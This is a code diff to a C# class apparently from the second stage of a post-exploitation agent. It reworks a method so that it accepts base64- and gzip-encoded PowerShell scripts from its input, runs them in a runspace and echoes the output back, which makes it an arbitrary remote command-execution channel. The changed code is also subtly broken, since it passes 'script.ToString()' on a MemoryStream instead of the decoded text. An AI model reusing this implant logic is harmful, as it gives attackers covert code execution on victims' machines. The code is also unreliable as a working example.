@@ -398,18 +398,33 @@ namespace stagetwo
 
         public void powershell()
         {
-            var command = ReadUntilLine("# ENDBLOCK");
-            System.Console.WriteLine("Running: ");
-            System.Console.Write(command);
+            System.IO.MemoryStream script;
+            try
+            {
+                var stream = new System.IO.MemoryStream(System.Convert.FromBase64String(System.Console.ReadLine()));
+                var gz = new System.IO.Compression.GZipStream(stream, System.IO.Compression.CompressionMode.Decompress);
+                script = new System.IO.MemoryStream();
+                gz.CopyTo(script);
+            } catch ( Exception e )
+            {
+                System.Console.WriteLine("E:DECODE");
+                return;
+            }
+
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
 
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
 
-            ps.AddScript(command);
-            ps.Invoke();
+            ps.AddScript(script.ToString());
+            var result = ps.Invoke();
             rs.Close();
+
+            foreach( var item in result)
+            {
+                System.Console.WriteLine(item.ToString());
+            }
         }
 
         public void csharp()
